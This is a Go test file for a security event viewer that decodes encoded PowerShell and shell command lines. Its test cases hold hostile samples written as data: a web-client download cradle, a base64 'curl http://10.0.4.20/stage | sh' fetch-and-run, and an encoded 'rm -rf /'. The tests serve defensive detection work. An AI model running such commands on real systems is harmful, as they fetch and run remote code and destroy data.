package ocsfview

import "testing"

// TestDecodeCommandLine: the two encodings a command line carries decode when
// they are clean, and nothing else does (adr/0300). PowerShell's encoded
// command is anchored on its flag in any of the spellings PowerShell accepts;
// a bare base64 blob has to be long enough to be meant as one, padded, and
// decode to wholly printable text. Innocent command lines never decode.
func TestDecodeCommandLine(t *testing.T) {
	cases := []struct {
		name, cmd, encoding, text string
	}{
		{"powershell -EncodedCommand", `powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell -enc, quoted", `powershell -nop -w hidden -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"`, EncodingBase64UTF16LE, "IEX (New-Object Net.WebClient)"},
		{"powershell -e", `powershell -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell /ec", `pwsh /ec ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell inside a quoted cmd sub-command", `cmd.exe /c "powershell -nop -w hidden -enc ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"powershell by path", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"shell base64 blob", `sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
		{"another tool's -e is not PowerShell's", `ssh -e hostname user@host`, "", ""},
		{"grep -e", `grep -e Database /etc/passwd`, "", ""},
		{"perl -e", `perl -e TESTTEST`, "", ""},
		{"flagged token that is not utf-16 gets no second guess", `powershell -enc d2hvYW1pOyBybSAtcmYgLw==`, "", ""},
		{"utf-16 garbage after a real flag", `powershell -enc hostname`, "", ""},
		{"bare base64 of a script", `python3 -c exec(__import__("base64").b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik="))`, "", ""},
		{"plain command", `C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule`, "", ""},
		{"a long alphanumeric word", `cmd.exe /c MicrosoftEdgeUpdateCore.exe`, "", ""},
		{"a guid", `rundll32.exe {4D36E972-E325-11CE-BFC1-08002BE10318}`, "", ""},
		{"a sha256", `certutil -hashfile a.exe SHA256 9f1c2e3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d`, "", ""},
		{"odd utf-16 length after -enc, too short to be a blob", `powershell -enc ZWNob3c=`, "", ""},
		{"binary that is valid base64", `tool --blob AAECAwQFBgcICQoLDA0ODw==`, "", ""},
		{"empty", ``, "", ""},
	}
	for _, c := range cases {
		encoding, text, ok := decodeCommandLine(c.cmd)
		if c.encoding == "" {
			if ok {
				t.Errorf("%s: decoded %q as %s; want nothing", c.name, text, encoding)
			}
			continue
		}
		if !ok || encoding != c.encoding || text != c.text {
			t.Errorf("%s: = %q %q %v; want %s %q", c.name, encoding, text, ok, c.encoding, c.text)
		}
	}
}

// TestRender_DecodedBesideTheOriginal: the process view carries the decoded
// command beside the field as stored; the group-by key stays on the stored
// value; a plain command line has no decoded slot; the scheduled job's
// command line decodes the same way.
func TestRender_DecodedBesideTheOriginal(t *testing.T) {
	v := Render(Event{ClassUID: 1007, Payload: payload(`{"process":{"name":"powershell.exe","pid":1,"cmd_line":"powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA="}}`)}, nil)
	if v.Decoded == nil || v.Decoded.Field != "process.cmd_line" || v.Decoded.Encoding != EncodingBase64UTF16LE || v.Decoded.Text != "echo" {
		t.Fatalf("decoded = %+v; want process.cmd_line base64-utf16le echo", v.Decoded)
	}
	if f, ok := fieldValue(v, "Command line"); !ok || f.Value != "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=" {
		t.Errorf("the stored command line is not rendered as stored: %+v", f)
	}
	for _, sv := range v.Slots {
		if sv.Name == "cmd_line" && sv.Identity != "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=" {
			t.Errorf("group-by key = %q; want the stored value", sv.Identity)
		}
	}
	plain := Render(Event{ClassUID: 1007, Payload: payload(`{"process":{"name":"svchost.exe","cmd_line":"svchost.exe -k netsvcs"}}`)}, nil)
	if plain.Decoded != nil {
		t.Errorf("plain command line decoded: %+v", plain.Decoded)
	}
	job := Render(Event{ClassUID: 1006, Payload: payload(`{"job":{"name":"Updater","command_line":"pwsh -enc ZQBjAGgAbwA="}}`)}, nil)
	if job.Decoded == nil || job.Decoded.Field != "job.command_line" || job.Decoded.Text != "echo" {
		t.Errorf("job decoded = %+v; want job.command_line echo", job.Decoded)
	}
}
